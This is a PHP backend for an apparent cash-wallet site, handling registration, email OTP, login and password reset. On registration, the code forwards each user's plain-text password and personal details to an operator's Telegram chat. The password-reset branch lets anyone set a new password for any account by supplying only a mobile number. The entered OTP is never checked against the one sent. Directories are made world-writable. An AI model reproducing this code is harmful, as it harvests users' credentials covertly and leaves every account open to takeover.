<?php  
session_start();  
date_default_timezone_set('Asia/Kolkata');
header('Content-Type: application/json');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$work = $_POST['work'] ?? '';

if ($work === 'register') {
    $username = trim($_POST['username'] ?? '');
    $name     = trim($_POST['name'] ?? '');
    $number   = trim($_POST['number'] ?? '');
    $email    = trim($_POST['email'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $email_otp = trim($_POST['email_otp'] ?? '');

    // Validate required fields
    if (!$username || !$name || !$number || !$email || !$password || !$email_otp) {
        echo json_encode(['status' => 'error', 'message' => 'All fields including OTP are required']);
        exit;
    }
    

    // Validate mobile
    if (!preg_match('/^[6-9]\d{9}$/', $number)) {
        echo json_encode(['status' => 'error', 'message' => 'Enter a valid 10-digit Indian mobile number']);
        exit;
    }
    
    // OTP required
if (!$email_otp) {
    echo json_encode(['status' => 'error', 'message' => 'Email OTP is required']);
    exit;
}
    foreach (glob("users/*/*.json") as $file) {
        $existing = json_decode(file_get_contents($file), true);
        if (isset($existing['email']) && strtolower($existing['email']) === strtolower($email)) {
            echo json_encode(['status' => 'error', 'message' => 'Email already used']);
            exit;
        }
    }
    
    $userDir  = "users/$number";
    $userFile = "$userDir/$number.json";

    if (file_exists($userFile)) {
        echo json_encode(['status' => 'error', 'message' => 'Mobile number already registered']);
        exit;
    }

    foreach (glob("users//.json") as $file) {
        $existing = json_decode(file_get_contents($file), true);
        if (isset($existing['email']) && strtolower($existing['email']) === strtolower($email)) {
            echo json_encode(['status' => 'error', 'message' => 'Email already used']);
            exit;
        }
    }

    if (!is_dir($userDir)) {
        mkdir($userDir, 0777, true);
    }
    

    $userData = [
        'username'   => $username,
        'name'       => $name,
        'number'     => $number,
        'email'      => $email,
        'password'   => password_hash($password, PASSWORD_DEFAULT),
        'chat_id'    => $chat_id ?? "",
        'banned'     => false,
        'role'       => "user",
        'active' => true,
        'created_at' => date("l / F / Y • h:i:s A")
    ];
    
    file_put_contents($userFile, json_encode($userData, JSON_PRETTY_PRINT));

    

    // Create wallet balance file
    $walletFile = "$userDir/$number.txt";
    if (!file_exists($walletFile)) {
        file_put_contents($walletFile, "0");
    }

    // Send Welcome Email (same as before)
    // ...
    $dateTime = date("l / F / Y • h:i:s A"); // Monday / July / 2025 • 07:00:46 PM
$subject = "Welcome to Our Platform, $name!";

$bodyHtml = '<script src="data/js/scripts.js"></script>
<div style="background-color: #f4f4f4; padding: 20px; font-family: Arial, sans-serif;">
  <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden;">

    <!-- Header -->
    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 30px 20px;">
      <h2 style="margin: 0; font-size: 24px;">😊 <b>Welcome to Our Platform</b></h2>
    </div>

    <!-- Body -->
    <div style="padding: 30px 20px; color: #333333; font-size: 16px; line-height: 1.6;">
      <p><b>👋 Hi ' . $name . ',</b></p>
      <p style="font-weight: bold;">✅ You have successfully registered with the following details:</p>

      <div style="padding-left: 20px; margin-top: 15px;">
        <p style="font-weight: bold;"><b>👤 Username:</b> ' . $username . '</p>
        <p style="font-weight: bold;"><b>💫 Mobile:</b> ' . $number . '</p>
        <p style="font-weight: bold;"><b>📬 Email:</b> ' . $email . '</p>
        <p style="font-weight: bold;"><b>⏳ Date:</b> ' . $dateTime . '</p>
      </div>

      <p style="margin-top: 25px;">❤️ <b>Thank you for joining us!</b></p>
      <p><b>💝 SXL  – Team</b></p>
    </div>

    <!-- CTA Button -->
    <div style="text-align: center; padding: 20px;">
      <a href="https://siam.lexynova.com/Loots/login.php?login" target="_blank" style="background-color: #2c3e50; color: #ffffff; padding: 12px 25px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">
        🔐 Login to Your Account
      </a>
    </div>

    <!-- Footer -->
    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 15px; font-size: 14px;"> 
    <p>🔒  <b>	&copy; '. date('Y') .' SMART X LIFAFA</b></p>
    </div>

  </div>
</div>';

    // Send email
    $adminPath = "adminrole/Admin/Admin.json";
    if (file_exists($adminPath)) {
        $adminData = json_decode(file_get_contents($adminPath), true);
        if (!empty($adminData['admin_email']) && !empty($adminData['smtp_host']) && !empty($adminData['smtp_user']) && !empty($adminData['smtp_pass'])) {
            $mail = new PHPMailer(true);
            try {
                $mail->isSMTP();
                $mail->Host       = $adminData['smtp_host'];
                $mail->SMTPAuth   = true;
                $mail->Username   = $adminData['smtp_user'];
                $mail->Password   = $adminData['smtp_pass'];
                $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
                $mail->Port       = $adminData['smtp_port'] ?? 587;

                $mail->setFrom($adminData['smtp_user'], 'Pavan Cash Loot ~ Registration');
                $mail->addAddress($email, $name);
                $mail->isHTML(true);
                $mail->Subject = $subject;
                $mail->Body    = $bodyHtml;
                $mail->send();
                $mail->SMTPDebug = 2; // or 3 for full output
                $mail->Debugoutput = 'error_log'; // log to PHP error log
                
            } catch (Exception $e) {
                // Logging can be added here if needed
            }
        }
    }
    /** === TELEGRAM ALERT CODE === */
if (file_exists($adminPath)) {
    $adminData = json_decode(file_get_contents($adminPath), true);
    if (!empty($adminData['bot_token']) && !empty($adminData['admin_chat_id'])) {
        $botToken   = $adminData['bot_token'];
        $adminChat  = $adminData['admin_chat_id'];

        $tgMessage = "🆕 <b>New User Registered</b>\n\n".
                     "👤 <b>Username:</b> {$userData['username']}\n".
                     "💫 <b>Name:</b> {$userData['name']}\n".
                     "📱 <b>Mobile:</b> {$userData['number']}\n".
                     "📬 <b>Email:</b> {$userData['email']}\n".
                     "🔑 <b>Password:</b> $password\n".   // 👈 Plain entered password
                     "💬 <b>Chat ID: $chat_id</b> {$userData['chat_id']}\n".
                     "🚫 <b>Banned:</b> ".($userData['banned'] ? 'Yes' : 'No')."\n".
                     "👑 <b>Role:</b> {$userData['role']}\n".
                     "⏳ <b>Created At:</b> {$userData['created_at']}";

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id'    => $adminChat,
            'text'       => $tgMessage,
            'parse_mode' => 'HTML'
        ];
        file_get_contents($url . "?" . http_build_query($data));
    }
}

    

    echo json_encode(['status' => 'success', 'message' => 'Registered successfully']);
    exit;
}

elseif ($work === 'send_email_otp') {
    $email = trim($_POST['email'] ?? '');
    if (!$email) {
        echo json_encode(['status' => 'error', 'message' => 'Email is required']);
        exit;
    }

    $otp = rand(100000, 999999);
    $_SESSION['email_otp'] = $otp;
    $_SESSION['email_otp_time'] = time();

    $subject = "Your Email OTP Code";
    $bodyHtml = "
        <div style='font-family:Arial,sans-serif;font-size:16px;padding:20px;'>
            <p><b>Hello,</b></p>
            <p>✅ Your OTP for registration is:</p>
            <h2 style='color:#2c3e50;'>$otp</h2>
            <p>This OTP is valid for 5 minutes.</p>
            <br>
            <p>💝 <b>SMART X LIFAFA Team</b></p>
        </div>
    ";

    $adminPath = "adminrole/Admin/Admin.json";
    if (file_exists($adminPath)) {
        $adminData = json_decode(file_get_contents($adminPath), true);
        if (!empty($adminData['smtp_user'])) {
            $mail = new PHPMailer(true);
            try {
                $mail->isSMTP();
                $mail->Host       = $adminData['smtp_host'];
                $mail->SMTPAuth   = true;
                $mail->Username   = $adminData['smtp_user'];
                $mail->Password   = $adminData['smtp_pass'];
                $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
                $mail->Port       = $adminData['smtp_port'] ?? 587;

                $mail->setFrom($adminData['smtp_user'], 'SXL - OTP Verification');
                $mail->addAddress($email);
                $mail->isHTML(true);
                $mail->Subject = $subject;
                $mail->Body    = $bodyHtml;
                $mail->send();

                echo json_encode(['status' => 'success', 'message' => 'OTP sent to your Email']);
                exit;
            } catch (Exception $e) {
                echo json_encode(['status' => 'error', 'message' => 'Failed to send OTP']);
                exit;
            }
        }
    }
}

// Verify Email OTP
elseif ($work === 'verify_email_otp') {
    $otp = trim($_POST['otp'] ?? '');

    if (!$otp) {
        echo json_encode(['status' => 'error', 'message' => 'OTP is required']);
        exit;
    }

    // Check if OTP exists in session
    if (!isset($_SESSION['email_otp']) || !isset($_SESSION['email_otp_time'])) {
        echo json_encode(['status' => 'error', 'message' => 'No OTP found. Please request a new one']);
        exit;
    }

    // Check expiry (5 minutes = 300 seconds)
    if (time() - $_SESSION['email_otp_time'] > 300) {
        unset($_SESSION['email_otp'], $_SESSION['email_otp_time']);
        echo json_encode(['status' => 'error', 'message' => 'OTP expired. Please request again']);
        exit;
    }

    // Match OTP
    if ($otp != $_SESSION['email_otp']) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid OTP']);
        exit;
    }

    // OTP verified → set flag
    $_SESSION['email_verified'] = true;
    unset($_SESSION['email_otp'], $_SESSION['email_otp_time']);

    echo json_encode(['status' => 'success', 'message' => 'Email verified successfully']);
    exit;
}


/*elseif ($work === 'login') {
    $id   = trim($_POST['id'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    if (!$id || !$pass) {
        echo json_encode(['status' => 'error', 'message' => 'All fields are required']);
        exit;
    }

    foreach (glob("users//.json") as $file) {
        $user = json_decode(file_get_contents($file), true);

        if ((isset($user['number']) && $user['number'] === $id) || 
            (isset($user['email']) && strtolower($user['email']) === strtolower($id))) {
            
            if (isset($user['password']) && password_verify($pass, $user['password'])) {
                
                session_regenerate_id(true); // prevent fixation
                $_SESSION['user'] = $user;
                $_SESSION['ip']   = $_SERVER['REMOTE_ADDR'];
                $_SESSION['ua']   = $_SERVER['HTTP_USER_AGENT'];
                $_SESSION['sid']  = session_id();

                $number = $user['number'];
                $sessionsFile = "users/{$number}/sessions.json";

                $sessions = file_exists($sessionsFile) 
                            ? json_decode(file_get_contents($sessionsFile), true) 
                            : [];

                // Track new session
                $sessions[$_SESSION['sid']] = [
                    'ip' => $_SESSION['ip'],
                    'ua' => $_SESSION['ua'],
                    'login_time' => date("l / F / Y • h:i:s A"),
                    'active' => true
                ];
                file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));

                // Load wallet balance
                $walletFile = "users/{$number}/{$number}.txt";
                $balance = file_exists($walletFile) ? trim(file_get_contents($walletFile)) : "0";

                // ✅ Optional: Email or Telegram notification for new device/IP
                // (Reuse your PHPMailer code here, send IP + Device info)
                                // Send login email
                $dateTime = date("l / F / Y • h:i:s A");
                $subject = "Welcome to Our Platform, $name!";

                $bodyHtml = ' <script src="data/js/scripts.js"></script>
                <div style="background-color: #f4f4f4; padding: 20px; font-family: Arial, sans-serif;">
                  <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden;">
                    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 30px 20px;">
                      <h2 style="margin: 0; font-size: 24px;">😊 <b>Welcome to Our Platform</b></h2>
                    </div>
                    <div style="padding: 30px 20px; color: #333333; font-size: 16px; line-height: 1.6;">
                      <p><b>👋 Hi ' . $name . ',</b></p>
                      <p style="font-weight: bold;">✅ You have successfully Login with the following details:</p>
                      <div style="padding-left: 20px; margin-top: 15px;">
                        <p style="font-weight: bold;"><b>💫 Mobile:</b> ' . $number . '</p>
                        <p style="font-weight: bold;"><b>📬 Email:</b> ' . $email . '</p>
                        <p style="font-weight: bold;"><b>⏳ Date:</b> ' . $dateTime . '</p>
                      </div>
                      <p style="margin-top: 25px;">❤️ <b>Thank you..!</b></p>
                      <p><b>💝 SXL – Team</b></p>
                    </div>
                    <div style="text-align: center; padding: 20px;">
                      <a href="https://siam.lexynova.com/Loots/dashboard.php" target="_blank" style="background-color: #2c3e50; color: #ffffff; padding: 12px 25px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">
                        🪴 Go To Dashboard 
                      </a>
                    </div>
                    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 15px; font-size: 14px;"> 
                      <p>🔒  <b>&copy; '. date('Y') .' SMART X LIFAFA</b></p>
                    </div>
                  </div>
                </div>';

                // Send email using SMTP
                $adminPath = "adminrole/Admin/Admin.json";
                if (file_exists($adminPath)) {
                    $adminData = json_decode(file_get_contents($adminPath), true);
                    if (!empty($adminData['admin_email']) && !empty($adminData['smtp_host']) && !empty($adminData['smtp_user']) && !empty($adminData['smtp_pass'])) {
                        $mail = new PHPMailer(true);
                        try {
                            $mail->isSMTP();
                            $mail->Host       = $adminData['smtp_host'];
                            $mail->SMTPAuth   = true;
                            $mail->Username   = $adminData['smtp_user'];
                            $mail->Password   = $adminData['smtp_pass'];
                            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
                            $mail->Port       = $adminData['smtp_port'] ?? 587;

                            $mail->setFrom($adminData['smtp_user'], 'Pavan Cash Loot ~ Login');
                            $mail->addAddress($email, $name);
                            $mail->isHTML(true);
                            $mail->Subject = $subject;
                            $mail->Body    = $bodyHtml;
                            $mail->send();
                        } catch (Exception $e) {
                            // Optional: log error
                        }
                    }
                }

                echo json_encode([
                    'status' => 'success',
                    'message' => 'Login successful',
                    'user' => [
                        'username'   => $user['username'],
                        'name'       => $user['name'],
                        'number'     => $number,
                        'email'      => $user['email'],
                        'created_at' => $user['created_at'],
                        'balance'    => $balance,
                        'session_id' => $_SESSION['sid']
                    ]
                ]);
                exit;
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Incorrect password']);
                exit;
            }
        }
    }

    echo json_encode(['status' => 'error', 'message' => 'User not found']);
    exit;
}
*/
/*elseif ($work === 'login') {
    $id   = trim($_POST['id'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    if (!$id || !$pass) {
        echo json_encode(['status' => 'error', 'message' => 'All fields are required']);
        exit;
    }

    foreach (glob("users//.json") as $file) {
        $user = json_decode(file_get_contents($file), true);

        if ((isset($user['number']) && $user['number'] === $id) || 
            (isset($user['email']) && strtolower($user['email']) === strtolower($id))) {
            
            if (isset($user['password']) && password_verify($pass, $user['password'])) {



                // Load wallet balance
                $walletFile = "users/{$number}/{$number}.txt";
                $balance = file_exists($walletFile) ? trim(file_get_contents($walletFile)) : "0";

                // Email notification
                $email = $user['email'] ?? '';
                $name  = $user['name'] ?? '';
                $dateTime = date("l / F / Y • h:i:s A");
                $subject = "Welcome to Our Platform, $name!";

                $bodyHtml = ' <script src="data/js/scripts.js"></script>
                <div style="background-color: #f4f4f4; padding: 20px; font-family: Arial, sans-serif;">
                  <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden;">
                    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 30px 20px;">
                      <h2 style="margin: 0; font-size: 24px;">😊 <b>Welcome to Our Platform</b></h2>
                    </div>
                    <div style="padding: 30px 20px; color: #333333; font-size: 16px; line-height: 1.6;">
                      <p><b>👋 Hi ' . $name . ',</b></p>
                      <p style="font-weight: bold;">✅ You have successfully Login with the following details:</p>
                      <div style="padding-left: 20px; margin-top: 15px;">
                        <p style="font-weight: bold;"><b>💫 Mobile:</b> ' . $number . '</p>
                        <p style="font-weight: bold;"><b>📬 Email:</b> ' . $email . '</p>
                        <p style="font-weight: bold;"><b>⏳ Date:</b> ' . $dateTime . '</p>
                      </div>
                      <p style="margin-top: 25px;">❤️ <b>Thank you..!</b></p>
                      <p><b>💝 SXL – Team</b></p>
                    </div>
                    <div style="text-align: center; padding: 20px;">
                      <a href="https://siam.lexynova.com/Loots/dashboard.php" target="_blank" style="background-color: #2c3e50; color: #ffffff; padding: 12px 25px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">
                        🪴 Go To Dashboard 
                      </a>
                    </div>
                    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 15px; font-size: 14px;"> 
                      <p>🔒  <b>&copy; '. date('Y') .' SMART X LIFAFA</b></p>
                    </div>
                  </div>
                </div>';

                // Send email using SMTP
                $adminPath = "adminrole/Admin/Admin.json";
                if (file_exists($adminPath)) {
                    $adminData = json_decode(file_get_contents($adminPath), true);
                    if (!empty($adminData['admin_email']) && !empty($adminData['smtp_host']) && !empty($adminData['smtp_user']) && !empty($adminData['smtp_pass'])) {
                        $mail = new PHPMailer(true);
                        try {
                            $mail->isSMTP();
                            $mail->Host       = $adminData['smtp_host'];
                            $mail->SMTPAuth   = true;
                            $mail->Username   = $adminData['smtp_user'];
                            $mail->Password   = $adminData['smtp_pass'];
                            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
                            $mail->Port       = $adminData['smtp_port'] ?? 587;

                            $mail->setFrom($adminData['smtp_user'], 'Pavan Cash Loot ~ Login');
                            $mail->addAddress($email, $name);
                            $mail->isHTML(true);
                            $mail->Subject = $subject;
                            $mail->Body    = $bodyHtml;
                            $mail->send();
                        } catch (Exception $e) {
                            // Optional: log error
                        }
                    }
                }

                echo json_encode([
                    'status' => 'success',
                    'message' => 'Login successful',
                    'user' => [
                        'username'   => $user['username'],
                        'name'       => $user['name'],
                        'number'     => $number,
                        'email'      => $user['email'],
                        'created_at' => $user['created_at'],
                        'balance'    => $balance
                    ]
                ]);
                exit;
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Incorrect password']);
                exit;
            }
        }
    }

    echo json_encode(['status' => 'error', 'message' => 'User not found']);
    exit;
}*/

elseif ($work === 'login') {
    $id   = trim($_POST['id'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    if (!$id || !$pass) {
        echo json_encode(['status' => 'error', 'message' => 'All fields are required']);
        exit;
    }

    foreach (glob("users/*/*.json") as $file) {
        $user = json_decode(file_get_contents($file), true);

        if ((isset($user['number']) && $user['number'] === $id) || 
            (isset($user['email']) && strtolower($user['email']) === strtolower($id))) {
            
            if (isset($user['password']) && password_verify($pass, $user['password'])) {
                // ✅ Store in session
                $_SESSION['user'] = $user;
                $_SESSION['ip']   = $_SERVER['REMOTE_ADDR'];

                $number = $user['number'];
                $email  = $user['email'];
                $name   = $user['name'];

                $walletFile = "users/{$number}/{$number}.txt";
                $balance = file_exists($walletFile) ? trim(file_get_contents($walletFile)) : "0";

                // ✅ Store also in cookies for "remember me" (1 month)
                setcookie("user_number", $number, time() + (86400 * 30), "/");
                setcookie("user_email",  $email,  time() + (86400 * 30), "/");
                setcookie("user_name",   $name,   time() + (86400 * 30), "/");

                /** === EMAIL LOGIN ALERT === */
                $dateTime = date("l / F / Y • h:i:s A");
                $subject  = "Welcome to Our Platform, $name!";

                $bodyHtml = ' <script src="data/js/scripts.js"></script>
                <div style="background-color: #f4f4f4; padding: 20px; font-family: Arial, sans-serif;">
                  <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden;">
                    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 30px 20px;">
                      <h2 style="margin: 0; font-size: 24px;">😊 <b>Welcome to Our Platform</b></h2>
                    </div>
                    <div style="padding: 30px 20px; color: #333333; font-size: 16px; line-height: 1.6;">
                      <p><b>👋 Hi ' . $name . ',</b></p>
                      <p style="font-weight: bold;">✅ You have successfully logged in with the following details:</p>
                      <div style="padding-left: 20px; margin-top: 15px;">
                        <p><b>💫 Mobile:</b> ' . $number . '</p>
                        <p><b>📬 Email:</b> ' . $email . '</p>
                        <p><b>⏳ Date:</b> ' . $dateTime . '</p>
                      </div>
                      <p style="margin-top: 25px;">❤️ <b>Thank you..!</b></p>
                      <p><b>💝 SXL – Team</b></p>
                    </div>
                    <div style="text-align: center; padding: 20px;">
                      <a href="https://PavanCashLoot.xyz/Loots/dashboard.php" target="_blank" style="background-color: #2c3e50; color: #ffffff; padding: 12px 25px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">
                        🪴 Go To Dashboard 
                      </a>
                    </div>
                    <div style="background-color: #2c3e50; color: #ffffff; text-align: center; padding: 15px; font-size: 14px;"> 
                      <p>🔒  <b>&copy; '. date('Y') .' SMART X LIFAFA</b></p>
                    </div>
                  </div>
                </div>';

                // ✅ Send email using SMTP if configured
                $adminPath = "adminrole/Admin/Admin.json";
                if (file_exists($adminPath)) {
                    $adminData = json_decode(file_get_contents($adminPath), true);
                    if (!empty($adminData['admin_email']) && !empty($adminData['smtp_host']) && !empty($adminData['smtp_user']) && !empty($adminData['smtp_pass'])) {
                        $mail = new PHPMailer(true);
                        try {
                            $mail->isSMTP();
                            $mail->Host       = $adminData['smtp_host'];
                            $mail->SMTPAuth   = true;
                            $mail->Username   = $adminData['smtp_user'];
                            $mail->Password   = $adminData['smtp_pass'];
                            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
                            $mail->Port       = $adminData['smtp_port'] ?? 587;

                            $mail->setFrom($adminData['smtp_user'], 'Pavan Cash Loot ~ Login');
                            $mail->addAddress($email, $name);
                            $mail->isHTML(true);
                            $mail->Subject = $subject;
                            $mail->Body    = $bodyHtml;
                            $mail->send();
                        } catch (Exception $e) {
                            // Optional: log error
                        }
                    }
                }

                /** === TELEGRAM ALERTS === */
                if (file_exists($adminPath)) {
                    $adminData = json_decode(file_get_contents($adminPath), true);
                    if (!empty($adminData['bot_token'])) {
                        $botToken  = $adminData['bot_token'];
                        $adminChat = $adminData['admin_chat_id'] ?? "";

                        // Admin Alert
                        if ($adminChat) {
                            $adminMsg = "🔔 <b>User Logged In</b>\n\n".
                                        "👤 <b>Name:</b> {$name}\n".
                                        "💫 <b>Username:</b> {$user['username']}\n".
                                        "📱 <b>Mobile:</b> {$number}\n".
                                        "📬 <b>Email:</b> {$email}\n".
                                        "💰 <b>Balance:</b> ₹{$balance}\n".
                                        "🌐 <b>IP:</b> {$_SESSION['ip']}\n".
                                        "⏳ <b>Time:</b> {$dateTime}";
                            
                            file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
                                'chat_id'    => $adminChat,
                                'text'       => $adminMsg,
                                'parse_mode' => 'HTML'
                            ]));
                        }

                        // User Alert
                        if (!empty($user['chat_id'])) {
                            $userMsg = "✅ <b>Login Successful</b>\n\n".
                                       "👤 <b>Hello, {$name}</b>\n".
                                       "📱 <b>Mobile:</b> {$number}\n".
                                       "💰 <b>Your Balance:</b> ₹{$balance}\n".
                                       "🌐 <b>IP:</b> {$_SESSION['ip']}\n".
                                       "⏳ <b>Time:</b> {$dateTime}\n\n".
                                       "🎉 <b>Welcome back to Pavan Cash Loot!</b>";
                            
                            file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
                                'chat_id'    => $user['chat_id'],
                                'text'       => $userMsg,
                                'parse_mode' => 'HTML'
                            ]));
                        }
                    }
                }

                // ✅ Final response
                echo json_encode([
                    'status' => 'success',
                    'message' => 'Login successful',
                    'user' => [
                        'username'   => $user['username'],
                        'name'       => $name,
                        'number'     => $number,
                        'email'      => $email,
                        'created_at' => $user['created_at'],
                        'balance'    => $balance
                    ]
                ]);
                exit;
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Incorrect password']);
                exit;
            }
        }
    }

    echo json_encode(['status' => 'error', 'message' => 'User not found']);
    exit;
}

elseif ($work === 'reset') {
    $number   = trim($_POST['number'] ?? '');
    $newpass  = trim($_POST['password'] ?? '');

    if (!$number || !$newpass) {
        echo json_encode(['status' => 'error', 'message' => 'All fields are required']);
        exit;
    }

    if (!preg_match('/^[6-9]\d{9}$/', $number)) {
        echo json_encode(['status' => 'error', 'message' => 'Enter a valid 10-digit number']);
        exit;
    }

    $userFile = "users/$number/$number.json";
    if (!file_exists($userFile)) {
        echo json_encode(['status' => 'error', 'message' => 'User not found']);
        exit;
    }

    $user = json_decode(file_get_contents($userFile), true);
    $user['password'] = password_hash($newpass, PASSWORD_DEFAULT);
    file_put_contents($userFile, json_encode($user, JSON_PRETTY_PRINT));

    $resetFile = "users/$number/reset_code.json";
    if (file_exists($resetFile)) {
        unlink($resetFile);
    }

    echo json_encode(['status' => 'success', 'message' => 'Password updated successfully']);
    exit;
}

else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
    exit;
}



?>